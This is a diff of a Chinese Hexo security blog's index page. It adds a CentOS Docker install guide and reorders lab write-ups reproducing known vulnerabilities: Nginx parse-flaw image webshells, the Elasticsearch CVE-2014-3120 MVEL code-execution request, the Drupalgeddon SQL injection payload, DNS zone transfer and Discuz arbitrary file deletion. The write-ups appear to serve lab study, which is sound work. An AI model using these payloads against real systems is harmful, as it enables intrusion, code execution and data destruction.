@@ -365,7 +365,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/ld (14)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/29/doaker/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -384,7 +384,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/07/28/ld (14)/" itemprop="url">Nginx 解析漏洞复现</a></h1>
+                <a class="post-title-link" href="/2019/07/29/doaker/" itemprop="url">Centos 7 安装docker</a></h1>
         
 
         <div class="post-meta">
@@ -396,8 +396,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-28T09:16:18+08:00">
-                2019-07-28
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-29T09:16:18+08:00">
+                2019-07-29
               </time>
             
 
@@ -437,7 +437,7 @@
         
           
             <hr>
-<h1 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx 解析漏洞复现"></a>Nginx 解析漏洞复现</h1><p>版本信息：<br>Nginx 1.x 最新版<br>PHP 7.x最新版<br>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。<br>直接执行docker-compose up -d启动容器，无需编译。<br>访问<a href="http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果。" target="_blank" rel="noopener">http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果。</a><br><a href="https://imgchr.com/i/mEEl7V" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEl7V.png" alt="mEEl7V.png"></a><br>增加/.php后缀，被解析成PHP文件：<br><a href="https://imgchr.com/i/mEE8tU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEE8tU.png" alt="mEE8tU.png"></a><br>通过测试可以看出这就是传说中的nginx解析漏洞：在/nginx.png后加/.php会将nginx.png当成php解析<br>然后浏览器访问 <a href="http://192.168.199.173/index.php，来测试一下上传功能，这里通过命令行执行copy" target="_blank" rel="noopener">http://192.168.199.173/index.php，来测试一下上传功能，这里通过命令行执行copy</a> lq.jpg/b+shell.php/a zzz.jpg，生成并上传图片马：<br><a href="https://imgchr.com/i/mEEw0x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEw0x.png" alt="mEEw0x.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEEWnI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEWnI.png" alt="mEEWnI.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEEo4S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEo4S.png" alt="mEEo4S.png"></a><br>现在通过浏览器访问，查看是否成功上传并解析：<br><a href="https://imgchr.com/i/mEEjH0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEjH0.png" alt="mEEjH0.png"></a><br>解析成功！<br>接下来通过蚁剑进行连接图片马，将图片马成功的解析路径作为蚁剑的连接路径：<br><a href="https://imgchr.com/i/mEVYUf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEVYUf.png" alt="mEVYUf.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEVa8g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEVa8g.png" alt="mEVa8g.png"></a><br>成功！</p>
+<h1 id="Centos-7-安装docker"><a href="#Centos-7-安装docker" class="headerlink" title="Centos 7 安装docker"></a>Centos 7 安装docker</h1><p>Docker介绍<br>Docker 是一个开放源代码软件项目，让应用程序布署在软件货柜下的工作可以自动化进行，借此在 Linux 操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。 Docker 利用 Linux 核心中的资源分离机制，例如 cgroups，以及 Linux 核心名字空间，来创建独立的容器。 –维基百科<br>&emsp;<br>安装Docker<br>移除旧版本的 Docker<br>yum remove docker <br>  docker-client <br>  docker-client-latest <br>  docker-common <br>  docker-latest <br>  docker-latest-logrotate <br>  docker-logrotate <br>  docker-selinux <br>  docker-engine-selinux <br>  docker-engine<br>&emsp;<br>创建 docker 组<br>groupadd docker<br>&emsp;<br>向 docker 组中添加您的用户<br>usermod -aG docker $USER<br>&emsp;<br>安装 Docker 依赖<br>yum install -y yum-utils device-mapper-persistent-data lvm2<br>&emsp;<br>添加源<br>yum-config-manager –add-repo <a href="https://download.docker.com/linux/centos/docker-ce.repo" target="_blank" rel="noopener">https://download.docker.com/linux/centos/docker-ce.repo</a><br>&emsp;<br>更新 yum 缓存<br>yum makecache fast<br>&emsp;<br>安装 Docker-CE<br>yum install -y docker-ce<br>&emsp;<br>开启 Docker<br>systemctl start docker<br>&emsp;<br>安装 Docker Compose<br>curl -L “<a href="https://github.com/docker/compose/releases/download/1.22.0/docker-compose-$" target="_blank" rel="noopener">https://github.com/docker/compose/releases/download/1.22.0/docker-compose-$</a>(uname -s)-$(uname -m)” -o /usr/local/bin/docker-compose<br>&emsp;<br>chmod +x /usr/local/bin/docker-compose<br>&emsp;<br>开机自启动<br>systemctl enable docker<br>&emsp;<br>镜像加速器<br>vim /etc/docker/daemon.json<br>&emsp;<br>{<br>  “registry-mirrors”: [<br>    “<a href="https://docker.mirrors.ustc.edu.cn&quot;" target="_blank" rel="noopener">https://docker.mirrors.ustc.edu.cn&quot;</a><br>  ]<br>}<br>&emsp;<br>“registry-mirrors”: [“<a href="https://docker.mirrors.ustc.edu.cn&quot;]" target="_blank" rel="noopener">https://docker.mirrors.ustc.edu.cn&quot;]</a> #中科大<br>重新启动服务<br>systemctl daemon-reload<br>systemctl restart docker</p>
 
           
         
@@ -559,6 +559,127 @@
           
             <hr>
 <h1 id="ElasticSearch-命令执行漏洞（CVE-2014-3120）"><a href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）" class="headerlink" title="ElasticSearch 命令执行漏洞（CVE-2014-3120）"></a>ElasticSearch 命令执行漏洞（CVE-2014-3120）</h1><p>ElasticSearch有脚本执行(scripting)的功能，可以很方便地对查询出来的数据再加工处理。<br>ElasticSearch用的脚本引擎是MVEL，这个引擎没有做任何的防护，或者沙盒包装，所以直接可以执行任意代码。<br>而在ElasticSearch里，默认配置是打开动态脚本功能的，因此用户可以直接通过http请求，执行任意代码<br>&emsp;<br>访问靶机<br><a href="https://imgchr.com/i/mEei01" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEei01.png" alt="mEei01.png"></a><br>漏洞复现<br>通过bp栏包<br><a href="https://imgchr.com/i/mEeMnA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEeMnA.png" alt="mEeMnA.png"></a><br>将Java代码放入json中<br>{<br>    “size”: 1,<br>    “query”: {<br>      “filtered”: {<br>        “query”: {<br>          “match_all”: {<br>          }<br>        }<br>      }<br>    },<br>    “script_fields”: {<br>        “command”: {<br>            “script”: “import java.io.<em>;new java.util.Scanner(Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()).useDelimiter(&quot;\\A&quot;).next();”<br>        }<br>    }<br>  }<br>首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据<br>POST /website/blog/ HTTP/1.1<br>Host: your-ip:9200<br>Accept: */</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 25<br>&amp;emsp<br>{<br>  “name”: “phithon”<br>}<br><a href="https://imgchr.com/i/mEeWu9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEeWu9.png" alt="mEeWu9.png"></a><br>然后，执行任意代码：<br>&emsp;<br>POST /_search?pretty HTTP/1.1<br>Host: 192.168.199.216:9200<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 343<br>&emsp;<br>{<br>    “size”: 1,<br>    “query”: {<br>      “filtered”: {<br>        “query”: {<br>          “match_all”: {<br>          }<br>        }<br>      }<br>    },<br>    “script_fields”: {<br>        “command”: {<br>            “script”: “import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()).useDelimiter(&quot;\\A&quot;).next();”<br>        }<br>    }<br>}<br><a href="https://imgchr.com/i/mEeH3D" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEeH3D.png" alt="mEeH3D.png"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/ld (14)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/28/ld (14)/" itemprop="url">Nginx 解析漏洞复现</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-28T09:16:18+08:00">
+                2019-07-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx 解析漏洞复现"></a>Nginx 解析漏洞复现</h1><p>版本信息：<br>Nginx 1.x 最新版<br>PHP 7.x最新版<br>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。<br>直接执行docker-compose up -d启动容器，无需编译。<br>访问<a href="http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果。" target="_blank" rel="noopener">http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果。</a><br><a href="https://imgchr.com/i/mEEl7V" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEl7V.png" alt="mEEl7V.png"></a><br>增加/.php后缀，被解析成PHP文件：<br><a href="https://imgchr.com/i/mEE8tU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEE8tU.png" alt="mEE8tU.png"></a><br>通过测试可以看出这就是传说中的nginx解析漏洞：在/nginx.png后加/.php会将nginx.png当成php解析<br>然后浏览器访问 <a href="http://192.168.199.173/index.php，来测试一下上传功能，这里通过命令行执行copy" target="_blank" rel="noopener">http://192.168.199.173/index.php，来测试一下上传功能，这里通过命令行执行copy</a> lq.jpg/b+shell.php/a zzz.jpg，生成并上传图片马：<br><a href="https://imgchr.com/i/mEEw0x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEw0x.png" alt="mEEw0x.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEEWnI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEWnI.png" alt="mEEWnI.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEEo4S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEo4S.png" alt="mEEo4S.png"></a><br>现在通过浏览器访问，查看是否成功上传并解析：<br><a href="https://imgchr.com/i/mEEjH0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEjH0.png" alt="mEEjH0.png"></a><br>解析成功！<br>接下来通过蚁剑进行连接图片马，将图片马成功的解析路径作为蚁剑的连接路径：<br><a href="https://imgchr.com/i/mEVYUf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEVYUf.png" alt="mEVYUf.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEVa8g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEVa8g.png" alt="mEVa8g.png"></a><br>成功！</p>
 
           
         
@@ -849,127 +970,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (10)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/26/ld (10)/" itemprop="url">DNS域传送漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
-                2019-07-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><p>DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞<br>&emsp;<br>在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用dig @your-ip <a href="http://www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：" target="_blank" rel="noopener">www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：</a><br><a href="https://imgchr.com/i/mE9VMV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9VMV.png" alt="mE9VMV.png"></a><br>发送axfr类型的dns请求：dig @192.168.199.151 -t axfr vulhub.org：<br><a href="https://imgchr.com/i/mE9GM6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9GM6.png" alt="mE9GM6.png"></a><br>可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。<br>我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone<br>transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn<br>-p 53 192.168.199.151。<br>可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。<br>我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone<br>transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn<br>-p 53 192.168.199.151。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (11)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1043,6 +1043,127 @@
           
             <hr>
 <h1 id="Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><a href="#Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）" class="headerlink" title="Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</h1><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。<br>&emsp;<br>访问靶机IP<br><a href="https://imgchr.com/i/mEilGj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEilGj.png" alt="mEilGj.png"></a><br>打开bp抓包  并发送以下数据包<br>&emsp;<br>POST /?q=node&amp;destination=node HTTP/1.1<br>Host: your-ip:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 120<br>&emsp;<br>pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or<br>updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a<br>&emsp;<br>可见，信息已被爆出<br><a href="https://imgchr.com/i/mEiUdU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEiUdU.png" alt="mEiUdU.png"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (10)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/26/ld (10)/" itemprop="url">DNS域传送漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
+                2019-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><p>DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞<br>&emsp;<br>在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用dig @your-ip <a href="http://www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：" target="_blank" rel="noopener">www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：</a><br><a href="https://imgchr.com/i/mE9VMV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9VMV.png" alt="mE9VMV.png"></a><br>发送axfr类型的dns请求：dig @192.168.199.151 -t axfr vulhub.org：<br><a href="https://imgchr.com/i/mE9GM6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9GM6.png" alt="mE9GM6.png"></a><br>可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。<br>我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone<br>transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn<br>-p 53 192.168.199.151。<br>可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。<br>我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone<br>transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn<br>-p 53 192.168.199.151。</p>
 
           
         
@@ -1322,143 +1443,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (9)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/26/ld (9)/" itemprop="url">Discuz!X 3.4 前台任意文件删除漏洞复现</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
-                2019-07-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="Discuz-X-3-4-前台任意文件删除漏洞复现"><a href="#Discuz-X-3-4-前台任意文件删除漏洞复现" class="headerlink" title="Discuz!X 3.4 前台任意文件删除漏洞复现"></a>Discuz!X 3.4 前台任意文件删除漏洞复现</h1><p>漏洞原理：<br>Discuz!X社区软件1，是一个采用PHP 和MySQL 等其他多种数据库构建的性能优<br>异、功能全面、安全稳定的社区论坛平台。<br>2017年9月29日，Discuz!修复了一个安全问题2用于加强安全性，这个漏洞会导<br>致前台用户可以导致任意删除文件漏洞。<br>2017年9月29日，知道创宇404 实验室开始应急，经过知道创宇404实验室分析<br>确认，该漏洞于2014年6月被提交到Wooyun漏洞平台，Seebug漏洞平台收录了该<br>漏洞3，漏洞编号ssvid-93588。该漏洞通过配置属性值，导致任意文件删除。<br>经过分析确认，原有的利用方式已经被修复，添加了对属性的formtype判断，<br>但修复方式不完全导致可以绕过，通过模拟文件上传可以进入其他unlink条<br>件，实现任意文件删除漏洞。<br>访问<a href="http://192.168.199.173/robots.txt" target="_blank" rel="noopener">http://192.168.199.173/robots.txt</a><br><a href="https://imgchr.com/i/mAskes" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAskes.png" alt="mAskes.png"></a><br>首先在网站的根文件夹里新建一个test.txt，用于测试。<br>进入个人设置，可以看到自己的个人资料，在这里摁下F12键。并通过Ctrl+F键<br>找到fromhash值：formhash=b5785099<br>用谷歌浏览器的hankbar插件，添加一条POST请求（将内容里的formhash<br>换为你自己刚才的到的那个）：<br>birthprovince=../../../test.txt&amp;profilesubmit=1&amp;formhash=b5785099<br><a href="https://imgchr.com/i/mAsKlF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAsKlF.png" alt="mAsKlF.png"></a><br>修改完之后，点击执行。然后返回到个人资料页面可以发现：<br><a href="https://imgchr.com/i/mAsYY6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAsYY6.png" alt="mAsYY6.png"></a><br>可以看出出生地已经修改为被删除文件的地址，下一步本地创建一个上传点页<br>面，代码如下，注意要修改成自己的formhash值，内容如下：</p>
-<form action="http://192.168.199.173/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovince]=aaaaaa" method="POST" enctype="multipart/form-data">
-<input type="file" name="birthprovince" id="file">
-<input type="text" name="formhash" value="b5785099"><p></p>
-<input type="text" name="profilesubmit" value="1"><p></p>
-<input type="submit" value="Submit">
-
-保存为zzz.html到桌面。然后切换到桌面双击进入该文件，可以看到
-[![mAswOH.png](https://s2.ax1x.com/2019/08/15/mAswOH.png)](https://imgchr.com/i/mAswOH)
-随便选一个图片进行上传，上床成功之后，test.txt就会被删除
-[![mAsW6g.png](https://s2.ax1x.com/2019/08/15/mAsW6g.png)](https://imgchr.com/i/mAsW6g)
-
-
-
-
-
-
-</form>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1509,7 +1493,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1522,7 +1506,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
